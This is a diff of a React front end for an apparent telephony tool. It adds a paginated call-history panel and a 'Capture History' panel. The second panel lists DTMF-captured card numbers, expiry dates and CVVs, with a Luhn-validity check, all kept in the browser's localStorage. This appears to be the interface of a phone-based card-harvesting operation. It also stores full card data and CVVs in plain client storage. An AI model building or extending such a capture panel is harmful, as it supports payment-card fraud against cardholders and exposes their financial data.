@@ -285,19 +285,186 @@ function StatCard({ label, value, color }: { label: string; value: string; color
   );
 }
 
+// ── CDR Panel (V1 parity: search, date filters, pagination, status colors) ──
+
+function CdrPanel() {
+  const [records, setRecords] = useState<any[]>([]);
+  const [total, setTotal] = useState(0);
+  const [page, setPage] = useState(1);
+  const [search, setSearch] = useState('');
+  const [dateFrom, setDateFrom] = useState('');
+  const [dateTo, setDateTo] = useState('');
+  const selectedSip = useAuthStore(s => s.selectedSipUser);
+  const role = useAuthStore(s => s.role);
+  const perPage = 25;
+
+  const cdrMsg = useWsMessage<any>('cdr_result');
+
+  useEffect(() => {
+    if (cdrMsg) {
+      setRecords(cdrMsg.records ?? []);
+      setTotal(cdrMsg.total ?? 0);
+    }
+  }, [cdrMsg]);
+
+  const loadCdr = useCallback((p: number = 1) => {
+    setPage(p);
+    const params: any = { cmd: 'get_cdr', page: p, perPage };
+    if (search.trim()) params.search = search.trim();
+    if (dateFrom) params.dateFrom = dateFrom;
+    if (dateTo) params.dateTo = dateTo;
+    if (selectedSip) {
+      if (selectedSip.startsWith('account:')) {
+        params.targetAccount = selectedSip.slice('account:'.length);
+      } else {
+        params.targetSip = selectedSip;
+      }
+    }
+    wsSend(params);
+  }, [search, dateFrom, dateTo, selectedSip]);
+
+  useEffect(() => { loadCdr(1); }, [selectedSip]);
+
+  const totalPages = Math.ceil(total / perPage);
+
+  const formatDur = (sec: number) => {
+    if (!sec) return '0s';
+    const m = Math.floor(sec / 60);
+    const s = sec % 60;
+    return m > 0 ? `${m}m ${s}s` : `${s}s`;
+  };
+
+  const formatDate = (dt: string) => {
+    try {
+      const d = new Date(dt.includes('T') ? dt : dt.replace(' ', 'T') + '+05:00');
+      return d.toLocaleString(undefined, { month: '2-digit', day: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' });
+    } catch { return dt; }
+  };
+
+  const statusColor = (s: string) => {
+    const up = (s || '').toUpperCase();
+    if (up === 'ANSWERED') return '#3fb950';
+    if (up === 'BUSY') return '#d29922';
+    return '#f85149';
+  };
+
+  return (
+    <div className="glass-panel">
+      <div className="panel-header">
+        <h2>Call History</h2>
+        <button onClick={() => loadCdr(page)} className="btn btn-sm">Refresh</button>
+      </div>
+      {/* Filters */}
+      <div className="flex gap-2 px-4 py-3 border-b border-ct-border-solid flex-wrap items-end">
+        <input type="text" value={search} onChange={e => setSearch(e.target.value)}
+          placeholder="Search number..." className="form-input !text-sm !w-40"
+          onKeyDown={e => e.key === 'Enter' && loadCdr(1)} />
+        <input type="date" value={dateFrom} onChange={e => setDateFrom(e.target.value)}
+          className="form-input !text-sm !w-36" />
+        <input type="date" value={dateTo} onChange={e => setDateTo(e.target.value)}
+          className="form-input !text-sm !w-36" />
+        <button onClick={() => loadCdr(1)} className="btn btn-sm btn-primary">Search</button>
+      </div>
+      {/* Table */}
+      {records.length === 0 ? (
+        <div className="empty-state">No call records found.</div>
+      ) : (
+        <div className="overflow-x-auto">
+          <table className="data-table">
+            <thead>
+              <tr>
+                <th>Date</th>
+                <th>From</th>
+                <th>To</th>
+                <th>Duration</th>
+                <th>Status</th>
+                <th>Cost</th>
+              </tr>
+            </thead>
+            <tbody>
+              {records.map((r, i) => (
+                <tr key={r.id || i}>
+                  <td className="font-mono text-xs whitespace-nowrap text-ct-muted">{formatDate(r.startTime || r.date || '')}</td>
+                  <td className="font-mono text-xs">{r.src || r.callerNum || '—'}</td>
+                  <td className="font-mono text-xs">{r.destination || r.calleeNum || '—'}</td>
+                  <td className="text-xs">{formatDur(r.duration ?? r.sessiontime ?? 0)}</td>
+                  <td><span style={{ color: statusColor(r.status || r.disposition || ''), fontWeight: 600, fontSize: '11px', textTransform: 'uppercase' }}>{(r.status || r.disposition || 'FAILED').toUpperCase()}</span></td>
+                  <td className="font-mono text-xs">${(r.cost ?? r.sessionbill ?? 0).toFixed(2)}</td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      )}
+      {/* Pagination */}
+      {totalPages > 1 && (
+        <div className="flex items-center justify-center gap-3 p-3 border-t border-ct-border-solid">
+          <button onClick={() => loadCdr(page - 1)} disabled={page <= 1} className="btn btn-sm">&laquo; Prev</button>
+          <span className="text-xs text-ct-muted">Page {page} of {totalPages} ({total} records)</span>
+          <button onClick={() => loadCdr(page + 1)} disabled={page >= totalPages} className="btn btn-sm">Next &raquo;</button>
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ── Capture History (V1: shows saved DTMF captures from localStorage) ──
+
+function CaptureHistoryPanel() {
+  const [captures, setCaptures] = useState<any[]>([]);
+
+  useEffect(() => {
+    try {
+      const data = JSON.parse(localStorage.getItem('ct2_capture_history') || '[]');
+      setCaptures(data);
+    } catch { setCaptures([]); }
+  }, []);
+
+  const clearHistory = () => {
+    localStorage.removeItem('ct2_capture_history');
+    setCaptures([]);
+  };
+
+  return (
+    <div className="glass-panel">
+      <div className="panel-header">
+        <h2>Capture History</h2>
+        {captures.length > 0 && <button onClick={clearHistory} className="btn btn-sm btn-danger">Clear</button>}
+      </div>
+      {captures.length === 0 ? (
+        <div className="empty-state">No captures recorded yet.</div>
+      ) : (
+        <div className="overflow-x-auto">
+          <table className="data-table">
+            <thead><tr><th>Time</th><th>CC</th><th>Exp</th><th>CVV</th><th>Luhn</th></tr></thead>
+            <tbody>
+              {captures.map((c, i) => (
+                <tr key={i}>
+                  <td className="text-xs text-ct-muted whitespace-nowrap">{new Date(c.timestamp).toLocaleString()}</td>
+                  <td className="font-mono text-xs">{c.cc || '—'}</td>
+                  <td className="font-mono text-xs">{c.exp || '—'}</td>
+                  <td className="font-mono text-xs">{c.cvv || '—'}</td>
+                  <td className="text-xs">{c.luhnValid === true ? <span style={{color:'#3fb950'}}>✓</span> : c.luhnValid === false ? <span style={{color:'#f85149'}}>✗</span> : '—'}</td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      )}
+    </div>
+  );
+}
+
 export function HistoryTab() {
   const role = useAuthStore((s) => s.role);
   const sipUsers = useAuthStore((s) => s.sipUsers);
-  // Show SIP usage panel for admin/user roles (or users with multiple SIP users)
   const showUsagePanel = role === 'admin' || role === 'user' || (sipUsers && sipUsers.length > 1);
 
   return (
-    <div role="tabpanel" id="panel-history">
+    <div className="space-y-5 animate-fade-in" role="tabpanel" id="panel-history">
       {showUsagePanel && <SipUsagePanel />}
-      <div className="glass-panel p-6">
-        <h2 className="text-lg font-semibold mb-4">Call History</h2>
-        <p className="text-ct-muted text-sm">Call detail records will appear here.</p>
-      </div>
+      <CdrPanel />
+      <CaptureHistoryPanel />
     </div>
   );
 }
